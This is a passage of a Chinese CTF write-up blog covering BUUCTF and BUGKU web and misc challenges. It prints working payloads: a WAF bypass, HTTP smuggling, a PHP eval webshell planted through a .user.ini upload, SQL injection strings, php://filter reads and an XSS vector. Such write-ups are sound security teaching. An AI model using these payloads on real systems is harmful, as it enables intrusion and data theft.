class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'num'</span>]))&#123;</span><br><span class=\"line\">    show_source(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        $str = $_GET[<span class=\"string\">'num'</span>];</span><br><span class=\"line\">        $blacklist = [<span class=\"string\">' '</span>, <span class=\"string\">'\\t'</span>, <span class=\"string\">'\\r'</span>, <span class=\"string\">'\\n'</span>,<span class=\"string\">'\\''</span>, <span class=\"string\">'\"'</span>, <span class=\"string\">'`'</span>, <span class=\"string\">'\\['</span>, <span class=\"string\">'\\]'</span>,<span class=\"string\">'\\$'</span>,<span class=\"string\">'\\\\'</span>,<span class=\"string\">'\\^'</span>];</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> ($blacklist <span class=\"keyword\">as</span> $blackitem) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (preg_match(<span class=\"string\">'/'</span> . $blackitem . <span class=\"string\">'/m'</span>, $str)) &#123;</span><br><span class=\"line\">                        <span class=\"keyword\">die</span>(<span class=\"string\">\"what are you want to do?\"</span>);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">eval</span>(<span class=\"string\">'echo '</span>.$str.<span class=\"string\">';'</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>本来我以为calc.php中的过滤即为waf，但是及时我们输入符合过滤规则题目也会触发报错，应该是加了waf，那么我们的请求的流程就是<code>提交请求-&gt;waf过滤-&gt;calc.php中再次过滤并执行</code>，这样的话按照上面的思路，我们可以在字段<code>num</code>前面加个空格，waf不会过滤该字段(因为该字段为<code>num</code>)，在PHP后端又会解析为<code>num</code>，这样就绕过了过滤</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;node3.buuoj.cn:27779&#x2F;calc.php?%20num&#x3D;phpinfo()</span><br></pre></td></tr></table></figure>\n<p>查看禁用函数</p>\n<p><img src=\"/2020/04/02/buuctf/13.png\" alt></p>\n<p>发现命令执行的函数被禁用了，那么我们可以使用<code>scandir</code>函数来获得目录，用<code>file_get_contents</code>来读文件，因为引号被过滤了，所以我们用asicc码来构造文件名</p>\n<p><img src=\"/2020/04/02/buuctf/14.png\" alt></p>\n<p><img src=\"/2020/04/02/buuctf/15.png\" alt></p>\n<p>PS: 通过查看题目waf过滤规则可以看到题目过滤的仅仅是参数<code>num</code>，如果被拦截则会返回403</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">SecRule ARGS:num &quot;@rx [a-zA-Z_\\x7f-\\xff\\x00-\\x24][a-zA-Z_0-9\\x7f-\\xff\\x00-\\x24]*&quot; &quot;id:001,msg:&#39;Hack&#39;,severity:ERROR,deny,status:403&quot;</span><br></pre></td></tr></table></figure>\n<hr>\n<p>此题目还有另一种方法可以绕过，就是利用HTTP走私攻击<a href=\"https://paper.seebug.org/1048/\" target=\"_blank\" rel=\"noopener\">https://paper.seebug.org/1048/</a>，当请求包含两个<code>Content-Length</code>时可以实现HTTP走私</p>\n<p><img src=\"/2020/04/02/buuctf/16.png\" alt></p>\n<p>因为waf服务器看到请求头中有两个content-length会返回400错误，但是后端却依然会处理该请求</p>\n<h1 id=\"SUCTF-2019-CheckIn\"><a href=\"#SUCTF-2019-CheckIn\" class=\"headerlink\" title=\"[SUCTF 2019]CheckIn\"></a>[SUCTF 2019]CheckIn</h1><p>题目简化了一下,直接给出了源码，核心部分如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">\"upload\"</span>])) &#123;</span><br><span class=\"line\">    $tmp_name = $_FILES[<span class=\"string\">\"fileUpload\"</span>][<span class=\"string\">\"tmp_name\"</span>];</span><br><span class=\"line\">    $name = $_FILES[<span class=\"string\">\"fileUpload\"</span>][<span class=\"string\">\"name\"</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!$tmp_name) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">\"filesize too big!\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!$name) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">\"filename cannot be empty!\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $extension = substr($name, strrpos($name, <span class=\"string\">\".\"</span>) + <span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (preg_match(<span class=\"string\">\"/ph|htacess/i\"</span>, $extension)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">\"illegal suffix!\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (mb_strpos(file_get_contents($tmp_name), <span class=\"string\">\"&lt;?\"</span>) !== <span class=\"keyword\">FALSE</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">\"&amp;lt;? in contents!\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $image_type = exif_imagetype($tmp_name);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!$image_type) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">\"exif_imagetype:not image!\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $upload_file_path = $userdir . <span class=\"string\">\"/\"</span> . $name;</span><br><span class=\"line\">    move_uploaded_file($tmp_name, $upload_file_path);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">\"Your dir \"</span> . $userdir. <span class=\"string\">' &lt;br&gt;'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">'Your files : &lt;br&gt;'</span>;</span><br><span class=\"line\">    var_dump(scandir($userdir));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>过滤有三个：</p>\n<blockquote>\n<ol>\n<li>文件名中不得出现<code>ph</code>或<code>htacess</code></li>\n<li>文件内容不得以<code>&lt;?</code>开头</li>\n<li>exif_imagetype()函数校验图片</li>\n</ol>\n</blockquote>\n<p>依次绕过：</p>\n<blockquote>\n<ol>\n<li>上传文件后缀修改为jpg</li>\n<li>用标签<code>&lt;script language=&quot;php&quot;&gt;phpinfo();@eval($_REQUEST[&#39;snow&#39;]);&lt;/script&gt;</code>来包裹PHP语句</li>\n<li>添加文件头</li>\n</ol>\n</blockquote>\n<p>接下来就是设法将jpg文件解析为PHP文件从而getshell，通过<code>.user.ini</code>文件可以实现该功能，在PHP官方文档中有详细的解释</p>\n<p><a href=\"https://www.php.net/manual/zh/configuration.file.per-user.php\" target=\"_blank\" rel=\"noopener\"></a></p>\n<p><img src=\"/2020/04/02/buuctf/17.png\" alt></p>\n<p>PHP启动时会在每个目录下扫描.user.ini文件，从被执行的PHP文件目录开始一直上升到web根目录。如果被执行的PHP文件在web根目录之外，则只扫描该目录。需要注意的是<strong>在.user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</strong><a href=\"https://www.php.net/manual/en/ini.list.php\" target=\"_blank\" rel=\"noopener\">https://www.php.net/manual/en/ini.list.php</a>可以查询配置名和设置模式，其中，有两个设置项很关键</p>\n<blockquote>\n<p><strong>auto_prepend_file</strong>: 指定在加载主文件之前解析的文件，相当于在主文件最前面加一个<code>require</code>语句<br><strong>auto_append_file</strong>： 与上面类似，只不过是在主文件结束之后解析</p>\n</blockquote>\n<p>所以攻击思路就是先上传一个.user.ini文件，指定要包含的jpg文件；然后上传jpg文件getshell</p>\n<p>上传<code>.user.ini</code>文件</p>\n<p><img src=\"/2020/04/02/buuctf/18.png\" alt></p>\n<p><code>#difine ...</code> 是为了绕过exif_imagetype()函数</p>\n<p>然后上传<code>exp.jpg</code></p>\n<p><img src=\"/2020/04/02/buuctf/19.png\" alt></p>\n<p>然后即可getflag</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;ec4f3f55-24f4-49f2-84e5-58b3b5f49a95.node3.buuoj.cn&#x2F;uploads&#x2F;76d9f00467e5ee6abc3ca60892ef304e&#x2F;index.php?snow&#x3D;system(%27cat%20&#x2F;flag%27);</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/04/02/buuctf/20.png\" alt></p>\n<blockquote>\n<p>这个漏洞感觉实际利用可能性不大，因为不大可能会有奇葩程序员会在保存上传文件的文件夹下放一个可执行的PHP文件</p>\n</blockquote>\n","categories":["复现"],"tags":["CTF","Web"]},{"title":"BUGKU-CTF题解","url":"/2018/03/12/bugkuwriteup/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>最近一段时间课比较少，做一做bugku的题目。<a href=\"http://ctf.bugku.com/\" target=\"_blank\" rel=\"noopener\">传送门</a></p>\n<a id=\"more\"></a>\n<h1 id=\"杂项\"><a href=\"#杂项\" class=\"headerlink\" title=\"杂项\"></a>杂项</h1><h2 id=\"签到题\"><a href=\"#签到题\" class=\"headerlink\" title=\"签到题\"></a>签到题</h2><p>加群即可</p>\n<h2 id=\"这是一张单纯的图片\"><a href=\"#这是一张单纯的图片\" class=\"headerlink\" title=\"这是一张单纯的图片\"></a>这是一张单纯的图片</h2><p>hex一下之后得到 <code>&#107;&#101;&#121;&#123;&#121;&#111;&#117;&#32;&#97;&#114;&#101;&#32;&#114;&#105;&#103;&#104;&#116;&#125;</code> ，Unicode解码即可(我这个是被解码后的)</p>\n<h2 id=\"隐写\"><a href=\"#隐写\" class=\"headerlink\" title=\"隐写\"></a>隐写</h2><p>改变高度即可得到flag，将7对应的第二行A4改为F4即可。</p>\n<h2 id=\"telnet\"><a href=\"#telnet\" class=\"headerlink\" title=\"telnet\"></a>telnet</h2><p>wireshark跑一下然后追踪tcp流即可</p>\n<h2 id=\"猜\"><a href=\"#猜\" class=\"headerlink\" title=\"猜\"></a>猜</h2><p>google搜索图片可知那是刘亦菲(liuyifei)。</p>\n<h2 id=\"流量分析（cnss）\"><a href=\"#流量分析（cnss）\" class=\"headerlink\" title=\"流量分析（cnss）\"></a>流量分析（cnss）</h2><p>这个题目我觉得挺坑的，用wireshark分析一下，因为题目也没任何提示，而且包里面貌似是CSRF，所以就在往这上面想，但是也没什么收获，反正这题数据包少，就随手追踪了第一条碰碰运气，结果它的请求引起了我的注意：</p>\n<blockquote>\n<p>GET /stat.htm?id=2724999&amp;r=http%3A%2F%2Fspace.bilibili.com%2F17190571&amp;lg=zh-cn&amp;ntime=1490634009&amp;cnzz_eid=418561883-1487085537-http%3A%2F%2Fwww.bilibili.com%2F&amp;showp=1536x864&amp;p=http%3A%2F%2Fspace.bilibili.com%2F17190571%2F%23!%2F&amp;t=Chrstm%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4%20-%20%E5%93%94%E5%93%A9%E5%93%94%E5%93%A9%20(%20%E3%82%9C-%20%E3%82%9C)%E3%81%A4%E3%83%AD%20%E4%B9%BE%E6%9D%AF~%20Bilibil…&amp;umuuid=15ab677e5a02ed-064c9a36304b67-27d1a36-144000-15ab677e5a4205b&amp;h=1&amp;rnd=1218637328 HTTP/1.1</p>\n</blockquote>\n<p>请求网址里面有个space.bilibili.com ，感觉这应该是某个用户的个人空间，尝试访问一下，结果就在个人空间里个性签名看到了熟悉的base64，解码两次即可得到flag。</p>\n<h2 id=\"做个游戏-08067CTF\"><a href=\"#做个游戏-08067CTF\" class=\"headerlink\" title=\"做个游戏(08067CTF)\"></a>做个游戏(08067CTF)</h2><p>下载之后是个游戏，直接二进制反编译一下，结果在PlaneGameFrame类里面找到了flag，记得flag还得再base64解码一下。</p>\n<h1 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h1><h2 id=\"web2\"><a href=\"#web2\" class=\"headerlink\" title=\"web2\"></a>web2</h2><p>直接查看元素即可</p>\n<h2 id=\"文件上传测试\"><a href=\"#文件上传测试\" class=\"headerlink\" title=\"文件上传测试\"></a>文件上传测试</h2><p>burpsuite抓包将图片文件改名为<strong><font face=\"futura\">2.png.php</font></strong>即可</p>\n<h2 id=\"计算器\"><a href=\"#计算器\" class=\"headerlink\" title=\"计算器\"></a>计算器</h2><p>直接计算即可，问题在于输入框只能输入以为数字，查看元素将最大长度改为3即可。</p>\n<h2 id=\"web基础-GET\"><a href=\"#web基础-GET\" class=\"headerlink\" title=\"web基础$_GET\"></a>web基础$_GET</h2><p>payload <code>?what=flag</code>    </p>\n<h2 id=\"web基础-POST\"><a href=\"#web基础-POST\" class=\"headerlink\" title=\"web基础$_POST\"></a>web基础$_POST</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">what&#x3D;flag</span><br></pre></td></tr></table></figure>\n<h2 id=\"矛盾\"><a href=\"#矛盾\" class=\"headerlink\" title=\"矛盾\"></a>矛盾</h2><p>用%00截断即可<strong><font face=\"futura\">?num=1%00adf</font></strong>，原理是==比较时只是对值的比较，会把不同类型转为同类型之后再行比较</p>\n<h2 id=\"Web3\"><a href=\"#Web3\" class=\"headerlink\" title=\"Web3\"></a>Web3</h2><p>阻止页面弹窗后查看元素，然后Unicode解码即可</p>\n<h2 id=\"sql注入\"><a href=\"#sql注入\" class=\"headerlink\" title=\"sql注入\"></a>sql注入</h2><p>查看元素发现是<font face=\"futura\">gb2312</font>的编码，测试<font face=\"futura\">?id=1%df’</font>则会报错，说明是宽字节注入，<br>payload<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;1%df&#39; union select 1,string from sql5.key where id&#x3D;1--+</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"域名解析\"><a href=\"#域名解析\" class=\"headerlink\" title=\"域名解析\"></a>域名解析</h2><p>直接在linux下打开hosts文件，输入下列文档</p>\n<blockquote>\n<p>120.24.86.145 flag.bugku.com</p>\n</blockquote>\n<p>我在部分linux下不能用，不知道是为什么。</p>\n<h2 id=\"sql注入1\"><a href=\"#sql注入1\" class=\"headerlink\" title=\"sql注入1\"></a>sql注入1</h2><p>过滤了关键字，尝试用%00绕过<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;-1 uni%00on sele%00ct 1,hash fr%00om sql3.key wh%00ere id&#x3D;1--+</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"你必须让他停下\"><a href=\"#你必须让他停下\" class=\"headerlink\" title=\"你必须让他停下\"></a>你必须让他停下</h2><p>页面一直停不下来，尝试了禁用js文件，还是不行，尝试burpsuite构造参数多次抓包，然后查看返回页面里则可以得到flag。</p>\n<h2 id=\"网站被黑\"><a href=\"#网站被黑\" class=\"headerlink\" title=\"网站被黑\"></a>网站被黑</h2><p>题目给出提示 <code>这个题没技术含量但是实战中经常遇到</code> ,打开后发现也没有什么泄露的问题，所以猜测应该是后台弱口令之类的问题，扫描了一下目录，发现有个shell.php，是个后台马，尝试了几个弱口令都不行，最终尝试爆破了一下，得到密码。（提示一下密码是四位）。</p>\n<h2 id=\"本地包含\"><a href=\"#本地包含\" class=\"headerlink\" title=\"本地包含\"></a>本地包含</h2><p>页面有代码泄露<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"keyword\">include</span> <span class=\"string\">\"waf.php\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">include</span> <span class=\"string\">\"flag.php\"</span>;</span><br><span class=\"line\">    $a = @$_REQUEST[<span class=\"string\">'hello'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">eval</span>( <span class=\"string\">\"var_dump($a);\"</span>);</span><br><span class=\"line\">    show_source(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p><strong>方法一</strong></p>\n<p>变量<strong><font face=\"futura\">request</font></strong>是一个http变量，可以接受post或者get和cookie的数组，代码中<code>eval( “var_dump($a);”)</code>存在可以利用的漏洞，可以把所要得到的文件dump出来。构造参数<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?hello&#x3D;file_get_contents(&#39;flag.php&#39;)</span><br></pre></td></tr></table></figure><br>浏览器php代码被截断，f12查看元素即可得到flag</p>\n<p><strong>方法二</strong></p>\n<p>其中第一句话<strong><font face=\"futura\">include “flag.php”</font></strong>可知文件包含在本地</p>\n<p>还是利用 <font face=\"futura\">eval()</font>函数，payload<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">1);print_r(file(&quot;.&#x2F;flag.php&quot;));%23</span><br></pre></td></tr></table></figure><br><strong><font face=\"futura\">%23</font></strong>的作用是注释掉eval函数后面的<strong><font face=\"futura\">“)</font></strong>形成闭合。</p>\n<h2 id=\"strcmp比较字符串\"><a href=\"#strcmp比较字符串\" class=\"headerlink\" title=\"strcmp比较字符串\"></a><font face=\"futura\">strcmp</font>比较字符串</h2><p>这个题目的问题在于PHP在5.3版本之前，对于字符串比较函数<font face=\"futura\">strcmp(p1,p2)</font>函数，如果p1&gt;p2，返回<strong><font face=\"futura\">&gt;0</font></strong>；如果p1=p2，返回<strong><font face=\"futura\">=0</font></strong>；如果p1 &lt; p2，返回<strong><font face=\"futura\">&#60;0</font></strong>。但是如果传递到参数是个数组，那么函数会报错，则会<code>return 0</code>，相当于判断为p1=p2了。故payload为<strong><font face=\"futura\">?a[]=1</font></strong>。</p>\n<h2 id=\"变量1\"><a href=\"#变量1\" class=\"headerlink\" title=\"变量1\"></a>变量1</h2><p>本题考查可变变量，故payload为 <code>?args=GLOBALS</code>，这里这个$$GLOBALS只能在eval中使用，却不能直接var_dump出来，不知道是为什么。</p>\n<h2 id=\"web5\"><a href=\"#web5\" class=\"headerlink\" title=\"web5\"></a>web5</h2><p>jspfuck查看代码，直接将代码扔进控制台即可</p>\n<h2 id=\"头等舱\"><a href=\"#头等舱\" class=\"headerlink\" title=\"头等舱\"></a>头等舱</h2><p>抓包查看请求头即可</p>\n<h2 id=\"管理员系统\"><a href=\"#管理员系统\" class=\"headerlink\" title=\"管理员系统\"></a>管理员系统</h2><p>修改xff本地登录，之后查看源代码发现最后一行有一段base64内容，解码之后是 <code>test123</code> ，所以直接以这个作为密码登录试一下，然后就拿到了flag</p>\n<h2 id=\"web4\"><a href=\"#web4\" class=\"headerlink\" title=\"web4\"></a>web4</h2><p>查看源代码发现有url编码的文本，按照 <code>eval(unescape(p1) + unescape(‘%35%34%61%61%32’ + p2));</code>语句拼接url编码并转码可得<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">function checkSubmit()&#123;</span><br><span class=\"line\">\tvar a&#x3D;document.getElementById(&quot;password&quot;);</span><br><span class=\"line\">\tif(&quot;undefined&quot;!&#x3D;typeof a)&#123;</span><br><span class=\"line\">\t\tif(&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;&#x3D;&#x3D;a.value)return!0;</span><br><span class=\"line\">\t\talert(&quot;Error&quot;);</span><br><span class=\"line\">\t\ta.focus();</span><br><span class=\"line\">\t\treturn!1</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">document.getElementById(&quot;levelQuest&quot;).onsubmit&#x3D;checkSubmit;</span><br></pre></td></tr></table></figure><br>查看代码可知将<strong><font fac=\"futura\">67d709b2b54aa2aa648cf6e87a7114f1</font></strong>提交即可。</p>\n<h2 id=\"flag在index里\"><a href=\"#flag在index里\" class=\"headerlink\" title=\"flag在index里\"></a>flag在index里</h2><p>查看元素发现有<code>href=”./index.php?file=show.php</code>语句，而题目又说flag在index里，所以应该是要查看index.php文件，burp抓包修改。payload</p>\n<blockquote>\n<p>file=php://filter/convert.base64-encode/resource=index.php</p>\n</blockquote>\n<h2 id=\"输入密码查看flag\"><a href=\"#输入密码查看flag\" class=\"headerlink\" title=\"输入密码查看flag\"></a>输入密码查看flag</h2><p>简答的弱口令爆破，密码13579</p>\n<h2 id=\"点击一百万次\"><a href=\"#点击一百万次\" class=\"headerlink\" title=\"点击一百万次\"></a>点击一百万次</h2><p>post参数为1000000即可</p>\n<h2 id=\"备份是个好习惯\"><a href=\"#备份是个好习惯\" class=\"headerlink\" title=\"备份是个好习惯\"></a>备份是个好习惯</h2><p>题目说了备份，查看index.php.bak可以下载到源码<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by PhpStorm.</span></span><br><span class=\"line\"><span class=\"comment\"> * User: Norse</span></span><br><span class=\"line\"><span class=\"comment\"> * Date: 2017/8/6</span></span><br><span class=\"line\"><span class=\"comment\"> * Time: 20:22</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">include_once</span> <span class=\"string\">\"flag.php\"</span>;</span><br><span class=\"line\">ini_set(<span class=\"string\">\"display_errors\"</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">$str = strstr($_SERVER[<span class=\"string\">'REQUEST_URI'</span>], <span class=\"string\">'?'</span>);</span><br><span class=\"line\">$str = substr($str,<span class=\"number\">1</span>);</span><br><span class=\"line\">$str = str_replace(<span class=\"string\">'key'</span>,<span class=\"string\">''</span>,$str);</span><br><span class=\"line\">parse_str($str);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> md5($key1);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> md5($key2);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> $flag.<span class=\"string\">\"取得flag\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure><br>阅读代码可知，提交两个md5值相等而本身值不相等的变量即可，同时还有变量guolv，双写绕过即可，这里提一下，这儿的     <code>REQUEST_URI</code>的输入方式www.xxx.com/aaa/ ,那么<strong><font face=\"futura\">aaa</font></strong>就是REQUEST_URI。本题payload</p>\n<blockquote>\n<p>/?kekeyy1[]=1&amp;kekeyy2[]=2/</p>\n</blockquote>\n<h2 id=\"成绩单\"><a href=\"#成绩单\" class=\"headerlink\" title=\"成绩单\"></a>成绩单</h2><p>常规的SQL注入<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">id&#x3D;1&#39; order by 4%23 #爆字段数</span><br><span class=\"line\">id&#x3D;-1&#39; union select 1,database(),3,4%23\t#爆数据库名</span><br><span class=\"line\">id&#x3D;-1&#39; union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema&#x3D;database()%23 #爆表名</span><br><span class=\"line\">id&#x3D;-1&#39; union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name&#x3D;&#39;fl4g&#39;%23 #爆字段名</span><br><span class=\"line\">id&#x3D;-1&#39; union select 1,skctf_flag,3,4 from fl4g%23</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"秋名山老司机\"><a href=\"#秋名山老司机\" class=\"headerlink\" title=\"秋名山老司机\"></a>秋名山老司机</h2><p>这个题只能2秒内提交，所以写个脚本<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">import re</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">url &#x3D; &quot;http:&#x2F;&#x2F;120.24.86.145:8002&#x2F;qiumingshan&#x2F;&quot;</span><br><span class=\"line\">r &#x3D; requests.session()</span><br><span class=\"line\">content &#x3D; r.get(url).text</span><br><span class=\"line\">par &#x3D; re.findall(r&#39;(.*?)&#x3D;.*?&#39;,content)</span><br><span class=\"line\">text &#x3D; par[1][5:]</span><br><span class=\"line\">ans &#x3D; eval(text)</span><br><span class=\"line\"></span><br><span class=\"line\">payload &#x3D; &#123;&#39;value&#39;:ans&#125;</span><br><span class=\"line\">content &#x3D; r.post(url,data&#x3D;payload).text</span><br><span class=\"line\">print(content)</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"速度要快\"><a href=\"#速度要快\" class=\"headerlink\" title=\"速度要快\"></a>速度要快</h2><p>这个题就是编程题，抓包就会发现有个flag值，被base64编码了，解之，然后查看元素</p>\n<blockquote>\n<p> OK ,now you have to post the margin what you find </p>\n</blockquote>\n<p>所以其实就是要提交margin值，但是这个题最骚的就是这个被base64解码后flag还需要在解码一次，也怪我，第一次解码后这个字符串倒是挺像base64的，怪我不够敏感，而且margin好像是css样式，应该解出数字才对。贴上代码<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">\"http://120.24.86.145:8002/web6/\"</span></span><br><span class=\"line\">r = requests.session()</span><br><span class=\"line\">content = r.get(url).headers[<span class=\"string\">'flag'</span>].encode(<span class=\"string\">'utf-8'</span>)</span><br><span class=\"line\">content = base64.b64decode(content)</span><br><span class=\"line\">content = content.decode(<span class=\"string\">'utf-8'</span>)[<span class=\"number\">15</span>:]</span><br><span class=\"line\">content = base64.b64decode(content)</span><br><span class=\"line\">payload = &#123;<span class=\"string\">'margin'</span>:content&#125;</span><br><span class=\"line\">res = r.post(url,data=payload).text</span><br><span class=\"line\">print(res)</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"COOKIE欺骗\"><a href=\"#COOKIE欺骗\" class=\"headerlink\" title=\"COOKIE欺骗\"></a>COOKIE欺骗</h2><p>解码filename发现是<code>keys.txt</code>，base64编码<code>index.php</code>替换之，然后改变line的参数即可得到全部php文件进行代码审计，改变cookie为margin=margin，再把filename的值为keys.php(要base64编码)，然后就OK了</p>\n<h2 id=\"XSS\"><a href=\"#XSS\" class=\"headerlink\" title=\"XSS\"></a>XSS</h2><p>这个题目是最简单的xss，所谓xss其实和sql注入差不多，这是xss用的是JavaScript语言，payload<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;src&#x3D;&quot;null&quot; onerror&#x3D;&quot;alert(_key_)&quot;\\u003e</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"never-give-up\"><a href=\"#never-give-up\" class=\"headerlink\" title=\"never give up\"></a>never give up</h2><p>看到提示有1p.html，但是查看会跳转，用view-source查看即可，然后恢复代码<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!$_GET[<span class=\"string\">'id'</span>])\t<span class=\"comment\">//$_GET['id']为空时执行该语句</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\theader(<span class=\"string\">'Location: hello.php?id=1'</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">exit</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$id=$_GET[<span class=\"string\">'id'</span>];</span><br><span class=\"line\">$a=$_GET[<span class=\"string\">'a'</span>];</span><br><span class=\"line\">$b=$_GET[<span class=\"string\">'b'</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span>(stripos($a,<span class=\"string\">'.'</span>))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> <span class=\"string\">'no no no no no no no'</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$data = @file_get_contents($a,<span class=\"string\">'r'</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>($data==<span class=\"string\">\"bugku is a nice plateform!\"</span> <span class=\"keyword\">and</span> $id==<span class=\"number\">0</span> <span class=\"keyword\">and</span> strlen($b)&gt;<span class=\"number\">5</span> <span class=\"keyword\">and</span> eregi(<span class=\"string\">\"111\"</span>.substr($b,<span class=\"number\">0</span>,<span class=\"number\">1</span>),<span class=\"string\">\"1114\"</span>) <span class=\"keyword\">and</span> substr($b,<span class=\"number\">0</span>,<span class=\"number\">1</span>)!=<span class=\"number\">4</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">require</span>(<span class=\"string\">\"f4l2a3g.txt\"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">print</span> <span class=\"string\">\"never never never give up !!!\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure><br>发现有个txt文件，不管别的，先看一下再说，结果直接出了flag，这应该是题目的漏洞。下面说正解<br>查看代码，$a的绕过的话 <code>a=php://input</code>，然后post<code>bugku is a nice plateform!</code>，<strong><font face=\"futura\">$id==0</font></strong>的绕过话可以用    <code>id=%00</code>绕过， <code>strlen($b)&gt;5 and eregi(“111”.substr($b,0,1),”1114”) and substr($b,0,1)!=4</code>的绕过可以用<strong><font face=\"futura\">b=%00123456</font></strong></p>\n<blockquote>\n<p>参看PHP手册可以知道<strong><font 